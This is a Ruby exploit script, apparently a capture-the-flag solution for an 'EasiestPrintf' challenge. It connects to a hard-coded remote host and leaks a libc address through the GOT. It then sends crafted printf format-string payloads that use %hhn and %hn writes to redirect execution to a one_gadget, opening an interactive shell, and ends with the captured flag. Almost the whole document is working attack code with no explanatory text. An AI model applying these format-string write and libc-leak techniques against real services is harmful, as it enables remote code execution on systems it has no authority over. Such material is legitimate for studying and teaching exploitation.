#!/usr/bin/env ruby
# encoding: ascii-8bit
require_relative '../../zocket/zocket'
require 'pry'
require 'pwn'      # https://github.com/peter50216/pwntools-ruby
require 'heapinfo' # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

host, port = '202.120.7.210', 12321
@local = false
(host = '127.0.0.1'; @local = true) if ARGV.empty?
$z = Zocket.new host, port #, logger: HexLogger.new
def z;$z;end
$h = heapinfo('EasiestPrintf')
def h;$h.reload!;end
#================= Exploit Start ====================
# 1 / 256

elf = ELF.new('EasiestPrintf')
z.gets "Which address you wanna read:\n"
z.puts elf.got.printf
z.gets '0x'
libc = ELF.new('libc.so.6')

libc.address = z.read(8).to_i(16)-libc.symbols.printf
h.offset(libc.address)

payload = '%x' + '%c' * 47 + "%#{0x2c-47-8+256}c" + "%hhn" + "%#{0xe6 - 0x2c}c" + "%50$hhn"
payload = payload.ljust(157, 'A')
z.puts payload

z.gets "Bye\n"
stk_base =  z.read(8).to_i(16)
p stk_base.hex

str = z.gets 'wanna'
fail unless str.include? 'wanna'
z.puts elf.got.printf # don't care
z.gets

addr = stk_base - 477
target = libc.address + 0x3e297 # one_gadget

a1 = target & 0xffff
a2 = target >> 16
payload = ("%#{a1}c%15$hn%#{a2-a1}c%16$n").ljust(32, "\x00") + p32(addr) + p32(addr+2)

z.puts payload
z.interact
# flag{Dr4m471c_pr1N7f_45_y0u_Kn0w}
